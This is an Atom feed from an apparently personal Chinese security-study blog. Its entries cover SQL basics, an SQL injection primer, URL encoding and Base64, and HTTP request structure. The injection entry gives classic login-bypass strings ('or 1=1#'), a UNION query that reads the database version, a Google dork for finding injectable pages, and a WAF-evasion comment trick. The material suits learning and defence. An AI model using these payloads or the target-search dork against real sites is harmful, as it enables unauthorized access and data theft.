<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汤小汤博客</title>
  
  
  <link href="http://www.tanglx.cn/atom.xml" rel="self"/>
  
  <link href="http://www.tanglx.cn/"/>
  <updated>2025-03-29T07:13:39.000Z</updated>
  <id>http://www.tanglx.cn/</id>
  
  <author>
    <name>tanglx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL基本语法</title>
    <link href="http://www.tanglx.cn/2025/03/28/linux/SQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>http://www.tanglx.cn/2025/03/28/linux/SQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</id>
    <published>2025-03-28T09:03:26.000Z</published>
    <updated>2025-03-29T07:13:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、SQL概念"><a href="#一、SQL概念" class="headerlink" title="一、SQL概念"></a>一、SQL概念</h1><p>Windows版mysql的安装：<a href="https://downloads.mysql.com/archives/installer/">下载链接</a><br>图形化sql操作软件(DBeaver)：<a href="https://dbeaver.io/download">下载链接</a></p><p><strong>SQL语言的分类</strong><br>由于数据库管理系统(数据库软件)功能非常多，不仅仅是存储数据,还要包含：数据的管理、表的管理、库的管理、账户的管理、权限管理等。<br>所以，操作数据库的SQL语言，也基于功能，可以分为四类:</p><ul><li>1.数据定义：DDL(Data Definition Language)<ul><li>库的创建删除、表的创建删除</li></ul></li><li>2.数据操作：DML(DataManipulation Language)<ul><li>新增数据、删除数据、修改数据等</li></ul></li><li>3.数据控制：DCL(Data Control Language)<ul><li>新增用户、删除用户、密码修改、权限管理等</li></ul></li><li>4.数据查询：DQL(Data Query Language)<ul><li>基于需求查询和计算数据</li></ul></li></ul><p><strong>SQL的语法特征</strong></p><ul><li>SQL语法，大小写不敏感</li><li>SQL可以单行或多行书写，最后以<code>;</code>号结束</li><li>SQL支持注释：<ul><li>单行注释：– 注释内容(– 后面要有空格)</li><li>单行注释：# 注释内容(# 后面可以不加空格，推荐加上)</li><li>多行注释：&#x2F;* 注释内容 *&#x2F;</li></ul></li></ul><h1 id="二、SQL基本语法"><a href="#二、SQL基本语法" class="headerlink" title="二、SQL基本语法"></a>二、SQL基本语法</h1><p><strong>1、数据库基本操作</strong><br>登录数据库(mysql):</p><pre><code class="shell">mysql -u用户 -p密码#-u后面跟用户 -p后面跟密码，没有空格例如：mysql -uroot -powaspbwa</code></pre><p>基本查看语法</p><pre><code class="sql">查看当前数据库用户：select user();查看所有数据库：show databases;使用库：use 库名;查看当前所在库:select database();查看所有表：show tables;/* 在不切换库的时候用show tables FROM 库名; */查看表结构：desc 表名;查看创建表sql语句: show create table 表名;#最后面加\G可以以行方式显示</code></pre><h1 id="三、DQL-数据查询"><a href="#三、DQL-数据查询" class="headerlink" title="三、DQL(数据查询)"></a>三、DQL(数据查询)</h1><p>查询语句最后加上\G; 可以以行的方式更直观显示，例如：<code>select * from users\G;</code></p><p>基础语法：<code>select 列 from 表 [where 条件判断];</code></p><pre><code class="sql">查询所有字段：select * from 表名;查询指定字段：select username,password from users;条件查询：select * from users where username=&#39;admin&#39;;逻辑与：select * from users where id=1 and username=&#39;admin&#39;;#两个条件都要满足逻辑或：select * from users where id=1 or username=&#39;admin1&#39;;#只需要满足一个条件/***在不切换库的时候直接查询使用：select 列 from 库名.表名 [where 条件判断];***/</code></pre><p><strong>排序分页</strong><br>排序基础语法：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc];</code><br>(order by 列，以这里的列为排序对象，asc为升序，desc为降序)<br>分页基础语法：<code>select 列 from 表 [where 条件判断] limit 显示数量;</code><br>排序分页嵌套：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc] limit 显示数量;</code></p><h1 id="四、DDL-库、表操作"><a href="#四、DDL-库、表操作" class="headerlink" title="四、DDL(库、表操作)"></a>四、DDL(库、表操作)</h1><p><strong>库操作</strong><br>查看有哪些数据库<br><code>show databases;</code><br>使用数据库<br><code>use 数据库名称</code><br>创建数据库<br><code>create database 数据库名称 charset utf8;</code><br>删除数据库<br><code>drop database 数据库名称;</code><br>查看当前是使用的数据库<br><code>select database();</code></p><p><strong>表操作</strong><br>查看有哪些表（需要先选择数据库）<br><code>show tables;</code><br>删除表<br><code>drop table 表名称;</code><br><code>drop table if exists 表名称;</code><br>创建表</p><pre><code class="sql">create table 表名称(    列名称 列类型,    列名称 列类型):/*列类型有int-- 整数float-- 浮点型varchar(长度)   --文本，长度为数字，做最大长度限制date-- 日期类型timestamp-- 时间戳类型*/</code></pre><h1 id="五、DML-数据操作"><a href="#五、DML-数据操作" class="headerlink" title="五、DML(数据操作)"></a>五、DML(数据操作)</h1><p>DML是指数据操作语言，英文全程是Data Manipulation Language ，用来对数据库表中记录进行更新。插入<code>insert</code>   删除<code>delete</code>   更新<code>update</code></p><p><strong>数据插入 insert</strong><br>基础语法：<code>insert into 表[(列1,列2,....列n)] values(值1,值2,....值n),(值1,值2,....值n)...,(值1,值2,....值n)</code><br>示例:</p><pre><code class="sql"># 创建表create table test_table(    ID int,    name varchar(20),    age int);# 仅插入id列数据insert into test_table(ID) values(10001),(10002),(10003);# 插入全部列数据insert into test_table(ID,name,age) values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);# 插入全部列数据，快捷写法insert into test_table values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);</code></pre><p><strong>数据删除 delete</strong><br>删除行<br>基础语法 ：<code>delete from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 删除name为王五的数据delete from test_table where name=&quot;王五&quot;# 删除ID&gt;=10005的数据delete from test_table where ID&gt;=10005</code></pre><p><strong>数据更新 update</strong><br>基础语法：<code>update 表 set 列=值 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 修改age列的全部数据为30update test_table set age=30# 修改ID为10004的name为李四update test_table set name=&quot;李四&quot; where ID=10004</code></pre><h1 id="六、UNION"><a href="#六、UNION" class="headerlink" title="六、UNION"></a>六、UNION</h1><p>UNION 主要功能是把两个或者更多 SELECT 语句的结果集合并成一个结果集。</p><p>示例：</p><pre><code class="sql">-- 第一条语句SELECT user, password FROM mysql.user;-- 第二条语句SELECT user, password FROM dvwa.users;-- 联合查询SELECT user, password FROM mysql.userUNIONSELECT user, password FROM dvwa.users;</code></pre><p><strong>UNION的使用前提：</strong></p><ul><li><strong>列的数量和顺序</strong>：参与 UNION 操作的所有 SELECT 语句，其选择的列数量必须相同，并且列的顺序也要一致。</li><li><strong>数据类型</strong>：对应的列的数据类型应该是兼容的，这样才能保证合并结果的正确性。(可以数据类型不一样)</li><li><strong>去重</strong>：UNION 操作默认会去除合并结果中的重复行。如果想保留所有行，包括重复行，可以使用 UNION ALL。</li></ul><p><strong>UNION 与 UNION ALL 的区别：</strong></p><ul><li><strong>UNION</strong>：会对合并后的结果集进行去重处理，也就是只保留唯一的行。</li><li><strong>UNION ALL</strong>：不会进行去重操作，会直接把所有结果集合并在一起，即使有重复行也会全部保留。所以 - - -UNION ALL 的执行效率通常比 UNION 高，因为它不需要进行去重操作。</li></ul><p><strong>适用场景:</strong></p><ul><li><strong>数据合并</strong>：当需要把多个表中结构相同的数据合并成一个结果集时，UNION 就非常有用。</li><li><strong>数据统计</strong>：在进行数据统计时，可能需要从不同的数据源中获取数据并合并，这时也可以使用 UNION。</li><li><strong>SQL注入攻击</strong>：帮助攻击者从数据库中获取额外的信息或者猜测sql列数</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、SQL概念&quot;&gt;&lt;a href=&quot;#一、SQL概念&quot; class=&quot;headerlink&quot; title=&quot;一、SQL概念&quot;&gt;&lt;/a&gt;一、SQL概念&lt;/h1&gt;&lt;p&gt;Windows版mysql的安装：&lt;a href=&quot;https://dow</summary>
      
    
    
    
    <category term="linux" scheme="http://www.tanglx.cn/categories/linux/"/>
    
    
    <category term="linux" scheme="http://www.tanglx.cn/tags/linux/"/>
    
    <category term="SQL" scheme="http://www.tanglx.cn/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://www.tanglx.cn/2025/03/28/%E7%BD%91%E5%AE%89/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.tanglx.cn/2025/03/28/%E7%BD%91%E5%AE%89/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-03-28T06:22:29.000Z</published>
    <updated>2025-04-02T08:18:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p><strong>SQL注入的危害：</strong></p><ul><li>盗取数据库中的信息</li><li>绕过登录认证(万能密码)</li></ul><h1 id="二、SQL注入的流程"><a href="#二、SQL注入的流程" class="headerlink" title="二、SQL注入的流程"></a>二、SQL注入的流程</h1><h2 id="2-1、寻找注入点"><a href="#2-1、寻找注入点" class="headerlink" title="2.1、寻找注入点"></a>2.1、寻找注入点</h2><p>寻找和数据库有交互的地方(例:注册、登录、搜索)<br>例：</p><pre><code class="url">https://www.xxxx.com/search.php?wk=xxx</code></pre><p><code>?wk=xxx</code>中xxx就是web服务器带入数据库中查询的字符串，这种情况就是和数据库交互的地方。</p><p>通过这种特征可以在谷歌搜索目标：</p><blockquote><p>谷歌搜索语法：inurl:php?id&#x3D;</p></blockquote><h2 id="2-2、判断闭合方式："><a href="#2-2、判断闭合方式：" class="headerlink" title="2.2、判断闭合方式："></a>2.2、判断闭合方式：</h2><ul><li>先判断是<strong>数字型</strong>还是<strong>字符串型</strong></li></ul><p>查看提交的参数例如<code>?wk=11</code>在11当中加入字符<code>?wk=11x</code>看有没有报错，如果报错说明是字符型。</p><ul><li>再判断闭合方式：</li></ul><p>在提交的参数后面加上一个引号(单&#x2F;双引号都有可能)例如：<code>?wk=11&#39; </code>,看是否有报错，如果都没有报错，说明大概率不存在SQL注入</p><h1 id="三、-SQL注入的分类"><a href="#三、-SQL注入的分类" class="headerlink" title="三、 SQL注入的分类"></a>三、 SQL注入的分类</h1><h2 id="3-1-、盲注"><a href="#3-1-、盲注" class="headerlink" title="3.1 、盲注"></a>3.1 、盲注</h2><p> 盲注就是在SQL注入过程中，找到注入点，执行SQL语句后，查询到的数据或者错误信息不能回显到前端页面，此时，我们需要利用一些方法进行判断或者猜测，这个过程称为盲注。</p><h3 id="3-1-1、布尔盲注"><a href="#3-1-1、布尔盲注" class="headerlink" title="3.1.1、布尔盲注"></a>3.1.1、布尔盲注</h3><p> “基于布尔判断的盲注”指的是利用SQL语句逻辑与(and)操作，判断and两边的条件是否成立，SQL语句带入数据库查询后判断返回内容(通常返回值仅有空和非空两种状态)，类似布尔型的true和false的两种状态;类似于无法开口说话的人，只能通过点头和摇头来告诉你答案正确与否。</p><p> <strong>布尔盲注的特性：</strong><br>构造条件判断式 SQL 语句，利用页面不同响应（条件为真时页面正常，为假时页面异常）来获取数据库信息。</p><p><strong>布尔注入的流程：</strong></p><h1 id="四、其它知识点"><a href="#四、其它知识点" class="headerlink" title="四、其它知识点"></a>四、其它知识点</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><h3 id="1、注释符的作用："><a href="#1、注释符的作用：" class="headerlink" title="1、注释符的作用："></a>1、注释符的作用：</h3><ul><li><strong>终止当前 SQL 语句</strong>，执行额外代码或绕过验证。</li><li><strong>隐藏恶意语句</strong>，避免语法错误。</li></ul><h3 id="2-常见数据库注释符"><a href="#2-常见数据库注释符" class="headerlink" title="2. 常见数据库注释符:"></a>2. 常见数据库注释符:</h3><table><thead><tr><th>数据库</th><th>单行注释符</th><th>多行注释符</th></tr></thead><tbody><tr><td><strong>MySQL</strong></td><td><code>#</code> 或 <code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>Oracle</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>SQL Server</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>PostgreSQL</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>注意</strong>：</td><td></td><td></td></tr></tbody></table><ul><li><code>-- </code> 后需加空格（MySQL&#x2F;SQL Server），<code>#</code> 后无需空格。</li><li>在url中的时候不能用<code>#</code>,需要用<code>--+</code>，#号会被当做特殊字符处理，–代表注释，+代表空格。</li></ul><h3 id="3-典型注入场景"><a href="#3-典型注入场景" class="headerlink" title="3. 典型注入场景"></a>3. 典型注入场景</h3><p> <strong>（1）登录绕过</strong></p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;admin&#39; -- &#39; AND password = &#39;任意值&#39;;</code></pre><ul><li><strong>注入点</strong>：用户名输入 <code>admin&#39; --</code>，密码任意。</li><li><strong>效果</strong>：注释掉密码验证部分，直接返回用户 <code>admin</code> 的记录。</li></ul><p><strong>（2）联合查询注入</strong></p><pre><code class="sql">SELECT id, name FROM products WHERE id = 1 UNION SELECT version(), null -- </code></pre><ul><li><strong>作用</strong>：隐藏原查询的后续条件，返回数据库版本号。</li></ul><h3 id="4-特殊技巧"><a href="#4-特殊技巧" class="headerlink" title="4. 特殊技巧"></a>4. 特殊技巧</h3><ul><li><strong>绕过WAF</strong>：使用 <code>--%0A</code>（换行符）或 <code>#</code> 绕过部分过滤规则。</li><li><strong>闭合引号</strong>：在字符型注入中，先闭合原引号再添加注释符：<pre><code class="sql">&#39; UNION SELECT 1,2,3#</code></pre></li></ul><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>“万能密码” 是攻击者利用 SQL 语句拼接漏洞，绕过正常的身份验证机制进入系统的方式。</p><p>形式1：<code>&#39; or 1=1#</code><br>形式2:<code>&#39; or &#39;1&#39;=&#39;1&#39;#</code><br>形式3：<code>admin&#39; or 1=1#</code></p><p><strong>举例登录验证场景：</strong><br>假设登录验证的 SQL 语句如下：</p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre><p>用万能密码<code>&#39; or 1=1#</code>组后：</p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;&#39; or 1=1#&#39; AND password = &#39;随意密码&#39;;</code></pre><p>经过组合后用户名为空，但是经过<code>or 1=1</code>后sql语句永远为真,#后面的全部被注释，服务端返回真，攻击者就能绕过登录验证 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入的危害：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;盗取数据库中的信息&lt;/li&gt;
&lt;li&gt;绕过登录认证(万能密码)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;二、SQL注入的流程&quot;&gt;&lt;a href=&quot;#二、SQL注入的流程&quot;</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="SQL注入" scheme="http://www.tanglx.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>URL编码和base64</title>
    <link href="http://www.tanglx.cn/2025/03/26/%E7%BD%91%E5%AE%89/URL%E7%BC%96%E7%A0%81%E5%92%8Cbase64/"/>
    <id>http://www.tanglx.cn/2025/03/26/%E7%BD%91%E5%AE%89/URL%E7%BC%96%E7%A0%81%E5%92%8Cbase64/</id>
    <published>2025-03-26T08:20:19.000Z</published>
    <updated>2025-03-26T08:32:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h3 id="一、URL编码"><a href="#一、URL编码" class="headerlink" title="一、URL编码"></a><strong>一、URL编码</strong></h3><p>URL编码是一种将URL中的非ASCII字符或特殊符号转换为 <code>%XX</code> 格式的技术（XX为十六进制值）。其核心规则包括：  </p><ul><li>空格可转为 <code>+</code> 或 <code>%20</code>；  </li><li>特殊字符（如 <code>?</code>, <code>#</code>, <code>&amp;</code> 等）需转为 <code>%</code> + 十六进制ASCII码；  </li><li>仅允许保留字符（如字母、数字、<code>-</code>, <code>_</code>, <code>.</code>, <code>~</code>）不编码。</li></ul><p><strong>示例</strong>：<br><code>http://example.com/你好?name=张三</code> → <code>http://example.com/%E4%BD%A0%E5%A5%BD?name=%E5%BC%A0%E4%B8%89</code>  </p><p><strong>应用场景</strong>：<br>URL参数、表单提交、路径中的特殊字符处理。  </p><h3 id="二、Base64"><a href="#二、Base64" class="headerlink" title="二、Base64"></a><strong>二、Base64</strong></h3><p>Base64是一种将二进制数据转换为可打印ASCII字符（<code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code>）的编码方式。其核心规则包括：  </p><ul><li>每3字节（24位）拆分为4组6位，映射到字符集；  </li><li>不足时用 <code>=</code> 填充。</li></ul><p><strong>示例</strong>：<br>中文“你好” → <code>5L2g5aW9</code>；<br>二进制 <code>00000001</code> → <code>AQ==</code>。  </p><p><strong>应用场景</strong>：<br>邮件附件、网页嵌入图片、API传输二进制数据、加密预处理。  </p><p><strong>工具函数</strong>：  </p><ul><li>JavaScript: <code>btoa()</code> &#x2F; <code>atob()</code>  </li><li>Python: <code>base64.b64encode()</code> &#x2F; <code>base64.b64decode()</code></li></ul><h3 id="三、URL编码-vs-Base64-对比表"><a href="#三、URL编码-vs-Base64-对比表" class="headerlink" title="三、URL编码 vs Base64 对比表"></a><strong>三、URL编码 vs Base64 对比表</strong></h3><table><thead><tr><th><strong>特性</strong></th><th><strong>URL编码</strong></th><th><strong>Base64</strong></th></tr></thead><tbody><tr><td><strong>用途</strong></td><td>URL中特殊字符转义（如 <code>?</code>, <code>#</code>）</td><td>二进制数据转文本（如图片、文件）</td></tr><tr><td><strong>字符集</strong></td><td><code>%</code> + 十六进制值（如 <code>%20</code> 代表空格）</td><td><code>A-Za-z0-9+/=</code></td></tr><tr><td><strong>可逆性</strong></td><td>完全可逆</td><td>完全可逆</td></tr><tr><td><strong>填充符</strong></td><td>无</td><td>有（<code>=</code>）</td></tr><tr><td><strong>数据长度</strong></td><td>可能增加（如汉字转为3字节 <code>%XX%XX%XX</code>）</td><td>增加约33%（4字符 → 3字节）</td></tr><tr><td><strong>加密性</strong></td><td>非加密（仅编码）</td><td>非加密（仅编码）</td></tr><tr><td><strong>常见场景</strong></td><td>URL参数、路径</td><td>邮件附件、图片嵌入、API数据传输</td></tr><tr><td><strong>URL安全变体</strong></td><td>无</td><td>有（<code>-</code> 替代 <code>+</code>，<code>_</code> 替代 <code>/</code>）</td></tr></tbody></table><h3 id="四、关键区别总结"><a href="#四、关键区别总结" class="headerlink" title="四、关键区别总结"></a><strong>四、关键区别总结</strong></h3><ol><li><p><strong>目标场景</strong>：  </p><ul><li>URL编码用于确保URL本身的合法性（如保留字符）。</li></ul></li><li><p><strong>字符处理</strong>：  </p><ul><li>URL编码直接替换特殊字符（如 <code>?</code> → <code>%3F</code>）。  </li><li>Base64将所有数据转换为字符集映射（如 <code>00000001</code> → <code>AQ==</code>）。</li></ul></li><li><p><strong>可逆性与安全性</strong>：  </p><ul><li>两者均为编码而非加密，敏感数据需额外加密处理。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;一、URL编码&quot;&gt;&lt;a href=&quot;#一、URL编码&quot; class=&quot;headerlink&quot; title=&quot;一、URL编码&quot;&gt;&lt;/a&gt;&lt;strong&gt;一、URL编码&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;URL编码是一种将URL中的非ASCII</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="URL编码" scheme="http://www.tanglx.cn/tags/URL%E7%BC%96%E7%A0%81/"/>
    
    <category term="base64" scheme="http://www.tanglx.cn/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>http请求参数</title>
    <link href="http://www.tanglx.cn/2025/03/26/%E7%BD%91%E5%AE%89/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
    <id>http://www.tanglx.cn/2025/03/26/%E7%BD%91%E5%AE%89/http%E8%AF%B7%E6%B1%82%E5%A4%B4/</id>
    <published>2025-03-26T07:36:02.000Z</published>
    <updated>2025-03-26T08:04:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、http介绍"><a href="#一、http介绍" class="headerlink" title="一、http介绍"></a>一、http介绍</h1><p><strong>http工作特点：</strong><br>1、无状态、2、支持c&#x2F;s模式、3、无连接、4、灵活、5、简单快速</p><p><strong>Cookie：</strong><br>Cookie是通过客户端保持状态的解决方案。从定义上来说，Cookie就是由服务器发给客户端的特殊信息，而这些信息以文本文件的方式存放在客户端，然后客户端每次尚服务器发送请求的时候都会带上这些特殊的信息<br>特点：<code>存储在客户端</code></p><p><strong>Session:</strong><br>Session叫会话，主要是用来检查请求数据中的Cookie字段是否在服务器存在和是否合法.<br>特点：<code>存储在服务端</code></p><p><strong>Cookie和Session的联系：</strong><br>由于HTTP协议是无状态，这个时候就需要有一个机制来告诉服务端本次操作用户是否登录，是哪个用户在执行的操作，那这套机制的实现就需要 Cookie和Session配合。</p><p><strong>报文请求格式:</strong><br>第一部分:请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本，请求类型为<code>POST</code> 要访问的资源为<code>/</code> ，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分:请求头部用来说明服务器要使用的附加信息。<br>第三部分:空行，空行是必须的。第四部分的请求数据为空，也必须有空行。<br>第四部分:请求数据也叫主体，可以添加任意的其他数据。</p><p><img src="https://picture.tanglx.cn/web/2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250323210604.png" alt="报文请求格式"></p><h1 id="二、请求行"><a href="#二、请求行" class="headerlink" title="二、请求行"></a>二、请求行</h1><p>HTTP 请求行是 HTTP 请求的第一行，用于标识请求的基本信息，格式为：</p><pre><code class="http">格式：&lt;方法&gt; &lt;目标资源&gt; &lt;协议版本&gt;举例：GET /index.html HTTP/1.1</code></pre><p><strong>请求方法：</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>用途</strong></th><th><strong>参数位置</strong></th><th><strong>安全性</strong></th><th><strong>幂等性</strong></th><th><strong>请求体支持</strong></th><th><strong>缓存</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>从服务器获取数据（查询操作）</td><td>参数附加在 <strong>URL</strong> 后（?key&#x3D;value）</td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>POST</strong></td><td>向服务器提交数据（写入操作）</td><td>参数放在 HTTP <strong>请求体</strong>（Body）中</td><td>不安全</td><td>非幂等</td><td>支持</td><td>默认不缓存</td></tr><tr><td><strong>PUT</strong></td><td>替换资源（完整更新）</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>PATCH</strong></td><td>部分更新资源</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>DELETE</strong></td><td>删除资源</td><td><strong>URL路径标识</strong>（如 <code>/res/123</code>）</td><td>不安全</td><td>幂等</td><td>支持（可选）</td><td>不可缓存</td></tr><tr><td><strong>HEAD</strong></td><td>获取资源元数据（无响应体）</td><td><strong>URL 查询参数</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>OPTIONS</strong></td><td>获取服务器支持的请求方法或跨域配置</td><td><strong>URL路径或全局</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>TRACE</strong></td><td>回显客户端请求（用于调试）</td><td><strong>URL路径</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>CONNECT</strong></td><td>建立隧道（用于代理转发 HTTPS）</td><td><strong>目标主机和端口</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr></tbody></table><h1 id="三、请求头"><a href="#三、请求头" class="headerlink" title="三、请求头"></a>三、请求头</h1><p>以下是常见 HTTP 请求头参数：</p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>User-Agent</strong></td><td>客户端信息（浏览器、操作系统等）</td><td><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.5735.198</code></td></tr><tr><td><strong>Accept</strong></td><td>指定客户端可接收的内容类型</td><td><code>Accept: text/html, application/json</code></td></tr><tr><td><strong>Content-Type</strong></td><td>请求体的 MIME 类型</td><td><code>Content-Type: application/x-www-form-urlencoded</code></td></tr><tr><td><strong>Content-Length</strong></td><td>请求体的字节长度（POST&#x2F;PUT 必需）</td><td><code>Content-Length: 348</code></td></tr><tr><td><strong>Host</strong></td><td>请求的目标主机和端口</td><td><code>Host: www.example.com:8080</code></td></tr><tr><td><strong>Cookie</strong></td><td>客户端发送的 Cookie 值</td><td><code>Cookie: sessionid=abc123; user=john</code></td></tr><tr><td><strong>Authorization</strong></td><td>用于身份验证的证书信息</td><td><code>Authorization: Basic dXNlcjpwYXNzd29yZA==</code></td></tr><tr><td><strong>Referer</strong></td><td>请求来源页面的 URL</td><td><code>Referer: https://www.example.com/previous-page</code></td></tr><tr><td><strong>Connection</strong></td><td>连接类型（如长连接）</td><td><code>Connection: Keep-Alive</code></td></tr><tr><td><strong>Cache-Control</strong></td><td>缓存控制指令</td><td><code>Cache-Control: max-age=3600</code></td></tr><tr><td><strong>Accept-Language</strong></td><td>客户端偏好的语言</td><td><code>Accept-Language: en-US, zh-CN</code></td></tr><tr><td><strong>Accept-Encoding</strong></td><td>客户端支持的压缩编码</td><td><code>Accept-Encoding: gzip, deflate</code></td></tr><tr><td><strong>X-Forwarded-For</strong></td><td>记录客户端真实 IP（代理或负载均衡场景下使用）</td><td><code>X-Forwarded-For: 203.0.113.1, 192.168.1.1</code></td></tr><tr><td><strong>Date</strong></td><td>请求发送的时间</td><td><code>Date: Wed, 26 Mar 2025 12:34:56 GMT</code></td></tr><tr><td><strong>If-Modified-Since</strong></td><td>资源修改时间匹配条件</td><td><code>If-Modified-Since: Wed, 26 Mar 2025 00:00:00 GMT</code></td></tr><tr><td><strong>Range</strong></td><td>请求资源的部分内容</td><td><code>Range: bytes=0-999</code></td></tr><tr><td><strong>Pragma</strong></td><td>实现特定的指令（如禁用缓存）</td><td><code>Pragma: no-cache</code></td></tr><tr><td><strong>TE</strong></td><td>传输编码偏好（如 chunked）</td><td><code>TE: trailers, chunked</code></td></tr><tr><td><strong>Via</strong></td><td>代理服务器信息</td><td><code>Via: 1.1 proxy.example.com (Apache/2.4.57)</code></td></tr><tr><td><strong>Max-Forwards</strong></td><td>代理转发次数限制</td><td><code>Max-Forwards: 5</code></td></tr></tbody></table><h1 id="四、空行"><a href="#四、空行" class="headerlink" title="四、空行"></a>四、空行</h1><p>  <strong>空行的作用</strong>：</p><ul><li>分隔请求头与请求体：空行是 HTTP 请求头与请求体之间的唯一分隔符，必须存在（即使请求体为空）。</li><li>结束请求头：服务器通过空行判断请求头已读取完毕，开始处理请求体。</li></ul><h1 id="五、请求体"><a href="#五、请求体" class="headerlink" title="五、请求体"></a>五、请求体</h1><p> 请求体的定义</p><ul><li>请求体（RequestBody）是 HTTP 请求中携带的数据部分，位于空行之后。</li><li>适用场景：常用于 POST、PUT、PATCH 等需要提交数据的方法。</li><li>GET 方法：通常不携带请求体（部分浏览器或服务器可能不支持）。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;一、http介绍&quot;&gt;&lt;a href=&quot;#一、http介绍&quot; class=&quot;headerlink&quot; title=&quot;一、http介绍&quot;&gt;&lt;/a&gt;一、http介绍&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;http工作特点：&lt;/strong&gt;&lt;br&gt;1、无</summary>
      
    
    
    
    <category term="网安" scheme="http://www.tanglx.cn/categories/%E7%BD%91%E5%AE%89/"/>
    
    
    <category term="渗透" scheme="http://www.tanglx.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="网安" scheme="http://www.tanglx.cn/tags/%E7%BD%91%E5%AE%89/"/>
    
    <category term="http" scheme="http://www.tanglx.cn/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>debian上挂载坚果云</title>
    <link href="http://www.tanglx.cn/2025/01/10/linux/debian%E4%B8%8A%E6%8C%82%E8%BD%BD%E5%9D%9A%E6%9E%9C%E4%BA%91/"/>
    <id>http://www.tanglx.cn/2025/01/10/linux/debian%E4%B8%8A%E6%8C%82%E8%BD%BD%E5%9D%9A%E6%9E%9C%E4%BA%91/</id>
    <published>2025-01-10T03:47:40.000Z</published>
    <updated>2025-01-21T11:49:46.000Z</updated>
    
